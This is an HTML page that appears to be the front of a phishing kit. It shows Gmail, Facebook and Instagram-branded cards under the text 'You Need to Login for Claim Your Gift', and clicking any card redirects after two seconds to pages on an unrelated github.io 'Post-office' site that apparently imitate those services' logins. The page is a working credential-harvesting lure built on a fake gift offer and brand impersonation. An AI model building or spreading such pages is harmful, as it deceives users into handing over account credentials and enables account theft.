<!DOCTYPE html>
<html lang="en">
<head>
    <title>Social Cards</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css" integrity="sha384-/rXc/GQVaYpyDdyxK+ecHPVYJSN9bmVFBvjA/9eOB+pb3F2w2N6fc5qB9Ew5yIns" crossorigin="anonymous">
    <style type="text/css">
    /* General Styles */
    body {
    background: #232323;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    font-family: Arial, sans-serif;
    height: 100vh;
    margin: 0;
    }
    
    /* Card Container */
    .cardBox {
    perspective: 1000px;
    margin: 2vw;
    width: 20vw;
    height: 20vw;
    max-width: 200px; /* Ensures cards are not too big on larger screens */
    max-height: 200px;
    }
    
    /* Card Styling */
    .card {
    position: relative;
    width: 100%;
    height: 100%;
    background: #FFF;
    transform-style: preserve-3d;
    transition: 1s;
    box-shadow: 0px 20px 20px rgba(0, 0, 0, 0.5);
    border-radius: 10%;
    }
    
    .facebook {
    background: #3b5998;
    }
    
    .instagram {
    background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
    }
    
    .gmail {
    background: #d14836;
    }
    
    /* Card Front and Back */
    .card-front,
    .card-back {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    color: #FFF;
    backface-visibility: hidden;
    }
    
    .card-front {
    display: flex;
    font-size: 6vw; /* Scales with screen size */
    justify-content: center;
    align-items: center;
    }
    
    .card-back {
    display: flex;
    font-size: 3vw; /* Scales with screen size */
    justify-content: center;
    align-items: center;
    transform: rotateY(180deg);
    }
    
    /* Hover Effect for Card */
    .cardBox:hover .card {
    transform: rotateY(180deg);
    }
    
    /* Gradient Text Styling */
    .gradient-text {
    font-size: 4vw; /* Scales with screen size */
    font-weight: bold;
    background: linear-gradient(90deg, #ff6a00, #ee0979, #3b82f6, #9c27b0);
    background-size: 400%;
    color: transparent;
    -webkit-background-clip: text;
    background-clip: text;
    animation: gradientShift 4s ease infinite;
    margin-top: 2vw;
    text-align: center;
    }
    
    /* Animation for Gradient */
    @keyframes gradientShift {
    0% {
    background-position: 0%;
    }
    50% {
    background-position: 100%;
    }
    100% {
    background-position: 0%;
    }
    }
    
    /* Mobile Responsiveness */
    @media (max-width: 768px) {
    .cardBox {
    width: 30vw;
    height: 30vw;
    }
    
    .card-front {
    font-size: 8vw;
    }
    
    .card-back {
    font-size: 4vw;
    }
    
    .gradient-text {
    font-size: 5vw;
    }
    }
    
    @media (max-width: 480px) {
    .cardBox {
    width: 40vw;
    height: 40vw;
    }
    
    .card-front {
    font-size: 10vw;
    }
    
    .card-back {
    font-size: 6vw;
    }
    
    .gradient-text {
    font-size: 6vw;
    }
    }
    </style>
</head>

<body>
    <!-- Gmail Card with Click Event -->
    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/Gmail')">
        <div class="card gmail">
            <div class="card-front"><i class="fas fa-envelope"></i></div>
            <div class="card-back">Gmail</div>
        </div>
    </div>
    
    <!-- Facebook Card with Click Event -->
    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/login')">
        <div class="card facebook">
            <div class="card-front"><i class="fab fa-facebook-f"></i></div>
            <div class="card-back">Facebook</div>
        </div>
    </div>
    
    <!-- Instagram Card with Click Event -->
    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/instagram')">
        <div class="card instagram">
            <div class="card-front"><i class="fab fa-instagram"></i></div>
            <div class="card-back">Instagram</div>
        </div>
    </div>

    <!-- Gradient Animated Text -->
    <div class="gradient-text">
        You Need to Login for Claim Your Gift
    </div>

    <script>
        // Function to flip the card and redirect after 2 seconds
        function flipAndRedirect(cardElement, url) {
            // Add class to flip the card
            cardElement.querySelector('.card').style.transform = 'rotateY(180deg)';

            // Wait 2 seconds, then redirect to the URL
            setTimeout(function() {
                window.location.href = url;
            }, 2000); // 2000 milliseconds = 2 seconds
        }
    </script>
</body>

</html>
